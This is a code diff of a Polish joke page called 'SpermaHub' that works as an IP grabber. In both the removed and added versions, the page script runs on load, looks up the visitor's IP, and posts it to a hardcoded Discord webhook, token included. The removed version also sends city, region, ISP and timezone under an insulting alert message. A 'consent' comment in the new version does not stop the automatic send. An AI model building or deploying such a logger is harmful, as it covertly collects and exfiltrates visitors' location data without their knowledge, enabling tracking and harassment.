@@ -7,97 +7,51 @@
     body {
       background-color: #000;
       color: #0f0;
-      font-family: 'Segoe UI', sans-serif;
+      font-family: sans-serif;
       text-align: center;
-      padding-top: 80px;
+      padding-top: 100px;
     }
     h1 {
       font-size: 5rem;
-      color: #0f0;
-    }
-    span.white {
-      color: #fff;
+      color: white;
     }
     p {
       font-size: 1.5rem;
-      margin-bottom: 10px;
     }
     .footer {
       margin-top: 50px;
       font-size: 1.2rem;
-      color: #888;
-    }
-    a {
-      color: #0ff;
-      text-decoration: none;
-    }
-    .gif-container {
-      margin-top: 40px;
-    }
-    .gif-container img {
-      max-width: 80%;
-      border-radius: 12px;
-      box-shadow: 0 0 20px #0f0;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
-  <h1>💦 <span class="white">Sperma</span><span>Hub</span></h1>
-  <p>🌍 Twoje IP: <strong id="ip">Ładowanie...</strong></p>
-
-  <div class="gif-container">
-    <!-- PODMIEŃ PONIŻSZY LINK NA WŁASNY GIF -->
-    <img src="https://cdn.discordapp.com/attachments/1366752851967348818/1389333105810342042/afbd77769d24f00d41c4504bb877385d.jpg?ex=68643cc8&is=6862eb48&hm=962de876556a69e08a6785c09630e2d3f3d7d6b4f197b8a9edf0b4d8d1fd7811&" alt="GIF">
-  </div>
-
-  <p class="footer">🔒 [fa-bolt] Podpierdalanie IP lol. | 👨‍💻 <a href="https://github.com/0piorun" target="_blank">0piorun</a></p>
+  <h1><span style="color: #0f0">Sperma</span><span style="color: white">Hub</span></h1>
+  <p>Twój adres IP to: <span id="ip">Ładowanie...</span></p>
+  <p class="footer">⚡ Podpierdalanie IP lol. Github: <a href="https://github.com/0piorun" target="_blank">0piorun</a></p>
 
   <script>
-    async function getInfoAndSend() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
+    async function getIPAndSend() {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const data = await ipRes.json();
+      document.getElementById('ip').innerText = data.ip;
 
-        const ip = data.ip;
-        const location = `${data.city}, ${data.region}, ${data.country_name}`;
-        const org = data.org;
-        const timezone = data.timezone;
+      // ✳️ Jeśli chcesz — wstaw swój webhook poniżej
+      const webhookUrl = "https://discord.com/api/webhooks/1389330375192346756/Q8VxNxk7lb8T9WIUr8jM7Mt1cGG4iA8iTwaYbrPvaO6RXZlvcrMTZYAd3QgutHPDvLt0";
 
-        document.getElementById('ip').innerText = ip;
-        document.getElementById('location').innerText = location;
-
-        const webhookURL = "https://discord.com/api/webhooks/1389330375192346756/Q8VxNxk7lb8T9WIUr8jM7Mt1cGG4iA8iTwaYbrPvaO6RXZlvcrMTZYAd3QgutHPDvLt0"; // ← Podmień tutaj
-
-        const payload = {
-          content: "@here nowy zjeb!!!",
-          embeds: [{
-            title: "📥 Nowe połączenie",
-            color: 65280,
-            fields: [
-              { name: "🌐 Adres IP", value: `\`${ip}\``, inline: false },
-              { name: "📍 Lokalizacja", value: location, inline: true },
-              { name: "🏢 Dostawca", value: org || "Nieznany", inline: true },
-              { name: "⏰ Strefa czasowa", value: timezone || "Brak danych", inline: false },
-              { name: "🕓 Czas", value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false }
-            ],
-            footer: {
-              text: "SpermaHub v1.0 - Github 0piorun"
-            }
-          }]
-        };
-
-        await fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-
-      } catch (err) {
-        console.error("Błąd pobierania danych IP lub wysyłania do Discorda:", err);
-      }
+      // ⚠️ Wyślij tylko jeśli masz zgodę użytkownika!
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          content: `Nowe IP odwiedzającego: ${data.ip}`
+        })
+      });
     }
 
-    getInfoAndSend();
+    getIPAndSend();
   </script>
 </body>
 </html>
